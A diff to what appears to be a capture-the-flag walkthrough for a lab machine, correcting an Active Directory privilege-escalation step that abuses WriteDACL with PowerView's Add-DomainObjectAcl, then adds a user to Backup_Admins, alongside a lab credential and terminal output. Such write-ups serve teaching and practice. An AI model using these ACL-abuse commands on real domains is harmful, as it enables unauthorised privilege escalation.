@@ -118,9 +118,13 @@ SSH as `claire:password123!`.
 
 ### Stage 3: WriteDACL → Backup_Admins
 
-Claire has `WriteDACL` on the `Backup_Admins` group -- just add herself:
+Claire has `WriteDACL` on the `Backup_Admins` group. `WriteDACL` doesn't add members directly -- first rewrite the group's ACL to grant ourselves add-member rights, then join:
 
 ```powershell
+# Use WriteDACL to grant claire the right to modify group membership
+Add-DomainObjectAcl -TargetIdentity backup_admins -PrincipalIdentity claire -Rights WriteMembers
+
+# Now we can add ourselves
 net group backup_admins claire /add
 ```
 
@@ -147,7 +151,7 @@ Log in as Administrator.
 
 {{< terminal title="root@reel" >}}
 whoami
-nt authority\system
+megabank\administrator
 {{< /terminal >}}
 
 ---
